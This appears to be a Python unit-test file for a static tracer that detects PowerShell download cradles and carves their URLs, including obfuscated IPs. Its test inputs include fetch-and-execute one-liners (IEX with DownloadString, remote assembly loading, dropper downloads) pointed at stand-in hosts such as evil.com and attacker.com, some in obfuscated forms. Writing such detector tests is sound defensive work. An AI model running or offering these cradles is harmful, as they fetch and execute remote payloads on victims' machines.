"""
Unit and integration tests for PowerShell DownloadString & WebClient API static tracer
and remote payload URL carving engine.
"""

import json
import unittest

from src.ast_nodes import IdentifierNode, StringLiteralNode
from src.webclient_tracer import (
    PowerShellWebClientTracer,
    RemotePayloadTarget,
    canonicalize_url,
    carve_all_urls,
    decode_host_ip,
    decode_ip_part,
    extract_download_urls,
    trace_webclient,
)


class TestWebClientTracer(unittest.TestCase):
    """Test suite for WebClient API tracing and URL carving."""

    def test_decode_ip_part(self):
        self.assertEqual(decode_ip_part("127"), 127)
        self.assertEqual(decode_ip_part("0x7f"), 127)
        self.assertEqual(decode_ip_part("0X7F"), 127)
        self.assertEqual(decode_ip_part("0177"), 127)  # octal 0177 = 127
        self.assertEqual(decode_ip_part("0"), 0)
        self.assertEqual(decode_ip_part("00"), 0)

    def test_decode_host_ip_dword_decimal(self):
        host, note = decode_host_ip("2130706433")
        self.assertEqual(host, "127.0.0.1")
        self.assertIsNotNone(note)
        self.assertIn("2130706433 -> 127.0.0.1", note)

        host2, note2 = decode_host_ip("3232235521")
        self.assertEqual(host2, "192.168.0.1")
        self.assertIsNotNone(note2)

    def test_decode_host_ip_hex_and_octal(self):
        # Single 32-bit hex integer
        host_hex, note_hex = decode_host_ip("0x7f000001")
        self.assertEqual(host_hex, "127.0.0.1")
        self.assertIsNotNone(note_hex)

        # Dotted hex
        host_dhex, note_dhex = decode_host_ip("0xC0.0xA8.0x01.0x01")
        self.assertEqual(host_dhex, "192.168.1.1")
        self.assertIsNotNone(note_dhex)

        # Dotted octal
        host_oct, note_oct = decode_host_ip("0177.0.0.1")
        self.assertEqual(host_oct, "127.0.0.1")
        self.assertIsNotNone(note_oct)

        # Standard decimal IP (unobfuscated)
        host_plain, note_plain = decode_host_ip("192.168.1.1")
        self.assertEqual(host_plain, "192.168.1.1")
        self.assertIsNone(note_plain)

        # Standard domain
        host_domain, note_domain = decode_host_ip("attacker.com")
        self.assertEqual(host_domain, "attacker.com")
        self.assertIsNone(note_domain)

    def test_canonicalize_url_components(self):
        raw = "http://2130706433:8080/scripts/beacon.ps1?token=xyz#frag"
        canon, scheme, host, port, path, query, ip_note, is_valid = canonicalize_url(raw)
        self.assertEqual(canon, "http://127.0.0.1:8080/scripts/beacon.ps1?token=xyz#frag")
        self.assertEqual(scheme, "http")
        self.assertEqual(host, "127.0.0.1")
        self.assertEqual(port, 8080)
        self.assertEqual(path, "/scripts/beacon.ps1")
        self.assertEqual(query, "token=xyz")
        self.assertIsNotNone(ip_note)
        self.assertTrue(is_valid)

    def test_canonicalize_url_backticks_and_missing_scheme(self):
        raw = "h`t`t`p`:`/`/`e`v`i`l`.`c`o`m`/`p`a`y`l`o`a`d`.`p`s`1"
        canon, scheme, host, port, path, query, ip_note, is_valid = canonicalize_url(raw)
        self.assertEqual(canon, "http://evil.com/payload.ps1")
        self.assertEqual(host, "evil.com")
        self.assertTrue(is_valid)

    def test_webclient_downloadstring_basic(self):
        code = "(New-Object Net.WebClient).DownloadString('http://attacker.com/stage1.ps1')"
        targets = trace_webclient(code)
        self.assertEqual(len(targets), 1)
        t = targets[0]
        self.assertEqual(t.url, "http://attacker.com/stage1.ps1")
        self.assertEqual(t.method, "DownloadString")
        self.assertEqual(t.api_type, "WebClient")
        self.assertEqual(t.cradle_type, "iex_download_string")
        self.assertEqual(t.host, "attacker.com")
        self.assertIsNone(t.destination_file)

    def test_webclient_downloadfile(self):
        code = "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://c2.example.org/drop.exe', 'C:\\Windows\\Temp\\drop.exe')"
        targets = trace_webclient(code)
        self.assertEqual(len(targets), 1)
        t = targets[0]
        self.assertEqual(t.url, "https://c2.example.org/drop.exe")
        self.assertEqual(t.method, "DownloadFile")
        self.assertEqual(t.destination_file, "C:\\Windows\\Temp\\drop.exe")
        self.assertEqual(t.cradle_type, "file_download_execute")

    def test_webclient_downloaddata_assembly_load(self):
        code = "[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://payloads.io/implant.dll'))"
        targets = trace_webclient(code)
        self.assertEqual(len(targets), 1)
        t = targets[0]
        self.assertEqual(t.url, "http://payloads.io/implant.dll")
        self.assertEqual(t.method, "DownloadData")
        self.assertEqual(t.cradle_type, "in_memory_assembly_load")

    def test_iex_wrapping_cradle(self):
        # IEX Command wrapping
        code1 = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/run.ps1')"
        targets1 = trace_webclient(code1)
        self.assertEqual(len(targets1), 1)
        self.assertEqual(targets1[0].cradle_type, "iex_download_string")

        # Piped into IEX
        code2 = "(New-Object Net.WebClient).DownloadString('http://evil.com/run.ps1') | IEX"
        targets2 = trace_webclient(code2)
        self.assertEqual(len(targets2), 1)
        self.assertEqual(targets2[0].cradle_type, "iex_download_string")

    def test_variable_chaining_and_url_concat(self):
        code = """
        $p1 = 'http://'
        $p2 = '192.168.50.10/'
        $p3 = 'beacon.ps1'
        $url = $p1 + $p2 + $p3
        $wc = New-Object Net.WebClient
        $wc.DownloadString($url)
        """
        targets = trace_webclient(code)
        self.assertEqual(len(targets), 1)
        self.assertEqual(targets[0].url, "http://192.168.50.10/beacon.ps1")
        self.assertEqual(targets[0].host, "192.168.50.10")

    def test_dynamic_method_invocation(self):
        code = "$wc = New-Object Net.WebClient; $wc.('Down'+'loadString')('http://target.local/script.ps1')"
        targets = trace_webclient(code)
        self.assertEqual(len(targets), 1)
        self.assertEqual(targets[0].url, "http://target.local/script.ps1")
        self.assertEqual(targets[0].method, "DownloadString")

    def test_format_operator_in_url(self):
        code = "$wc = New-Object Net.WebClient; $wc.DownloadString(('{0}{1}{2}' -f 'http://', 'malicious.xyz/', 'loader.ps1'))"
        targets = trace_webclient(code)
        self.assertEqual(len(targets), 1)
        self.assertEqual(targets[0].url, "http://malicious.xyz/loader.ps1")

    def test_obfuscated_dword_ip_carving(self):
        code = "(New-Object Net.WebClient).DownloadString('http://2130706433:8000/payload.ps1')"
        targets = trace_webclient(code)
        self.assertEqual(len(targets), 1)
        t = targets[0]
        self.assertEqual(t.url, "http://127.0.0.1:8000/payload.ps1")
        self.assertEqual(t.host, "127.0.0.1")
        self.assertEqual(t.port, 8000)
        self.assertIn("2130706433 -> 127.0.0.1", t.ip_decoded)

    def test_obfuscated_octal_ip_carving(self):
        code = "$wc = New-Object Net.WebClient; $wc.DownloadFile('http://0177.0.0.1/mal.exe', 'test.exe')"
        targets = trace_webclient(code)
        self.assertEqual(len(targets), 1)
        self.assertEqual(targets[0].url, "http://127.0.0.1/mal.exe")
        self.assertIn("0177.0.0.1 -> 127.0.0.1", targets[0].ip_decoded)

    def test_cmdlet_invoke_webrequest(self):
        code = "Invoke-WebRequest -Uri 'https://download.site/agent.exe' -OutFile 'agent.exe' -UserAgent 'CustomAgent/2.0'"
        targets = trace_webclient(code)
        self.assertEqual(len(targets), 1)
        t = targets[0]
        self.assertEqual(t.url, "https://download.site/agent.exe")
        self.assertEqual(t.method, "invoke-webrequest")
        self.assertEqual(t.api_type, "Cmdlet")
        self.assertEqual(t.destination_file, "agent.exe")
        self.assertEqual(t.headers.get("User-Agent"), "CustomAgent/2.0")

    def test_cmdlet_iwr_and_irm_positional(self):
        code = "iwr 'http://quick.drop/p.ps1'; irm 'https://c2.hub/api/task'"
        targets = trace_webclient(code)
        urls = {t.url for t in targets}
        self.assertIn("http://quick.drop/p.ps1", urls)
        self.assertIn("https://c2.hub/api/task", urls)

    def test_cmdlet_start_bitstransfer(self):
        code = "Start-BitsTransfer -Source 'http://bits.server/payload.bin' -Destination 'C:\\Temp\\p.bin'"
        targets = trace_webclient(code)
        self.assertEqual(len(targets), 1)
        t = targets[0]
        self.assertEqual(t.url, "http://bits.server/payload.bin")
        self.assertEqual(t.api_type, "BitsTransfer")
        self.assertEqual(t.cradle_type, "bits_transfer")
        self.assertEqual(t.destination_file, "C:\\Temp\\p.bin")

    def test_httpclient_and_webrequest_calls(self):
        code = """
        $client = [System.Net.Http.HttpClient]::new()
        $client.GetStringAsync('https://api.github.com/repos/test')
        [System.Net.WebRequest]::Create('http://raw.paste.ee/d/abc')
        """
        targets = trace_webclient(code)
        urls = {t.url for t in targets}
        self.assertIn("https://api.github.com/repos/test", urls)
        self.assertIn("http://raw.paste.ee/d/abc", urls)

    def test_headers_and_proxy_tracking(self):
        code = """
        $wc = New-Object Net.WebClient
        $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
        $wc.Headers.Add('X-Auth', 'Secret123')
        $wc.Proxy = 'http://127.0.0.1:8888'
        $wc.DownloadString('http://protected.c2.org/beacon')
        """
        targets = trace_webclient(code)
        self.assertEqual(len(targets), 1)
        t = targets[0]
        self.assertEqual(t.headers.get("User-Agent"), "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        self.assertEqual(t.headers.get("X-Auth"), "Secret123")
        self.assertEqual(t.proxy, "http://127.0.0.1:8888")

    def test_heuristic_regex_fallback_carve(self):
        # Code containing URL in an unstructured variable or comment
        code = """
        # Download server mirror: http://mirror.backup-c2.net/failover.ps1
        $extra_urls = @('https://uncalled.endpoint.com/data.json')
        """
        targets = carve_all_urls(code)
        urls = {t.url for t in targets}
        self.assertIn("http://mirror.backup-c2.net/failover.ps1", urls)
        self.assertIn("https://uncalled.endpoint.com/data.json", urls)

    def test_extract_download_urls_convenience_helper(self):
        code = """
        (New-Object Net.WebClient).DownloadString('http://a.com/1.ps1')
        (New-Object Net.WebClient).DownloadString('http://b.com/2.ps1')
        (New-Object Net.WebClient).DownloadString('http://a.com/1.ps1')
        """
        urls = extract_download_urls(code)
        self.assertEqual(urls, ["http://a.com/1.ps1", "http://b.com/2.ps1"])

    def test_target_serialization(self):
        target = RemotePayloadTarget(
            url="http://127.0.0.1/test.ps1",
            raw_url="http://2130706433/test.ps1",
            method="DownloadString",
            api_type="WebClient",
            destination_file=None,
            headers={"User-Agent": "Bot/1.0"},
            proxy="http://proxy:8080",
            cradle_type="iex_download_string",
            scheme="http",
            host="127.0.0.1",
            port=None,
            path="/test.ps1",
            query="",
            ip_decoded="2130706433 -> 127.0.0.1",
            is_valid_url=True,
            confidence=1.0,
        )
        d = target.to_dict()
        self.assertEqual(d["url"], "http://127.0.0.1/test.ps1")
        self.assertEqual(d["ip_decoded"], "2130706433 -> 127.0.0.1")
        # Ensure JSON-serializable
        serialized = json.dumps(d)
        self.assertIn("127.0.0.1", serialized)


if __name__ == "__main__":
    unittest.main()
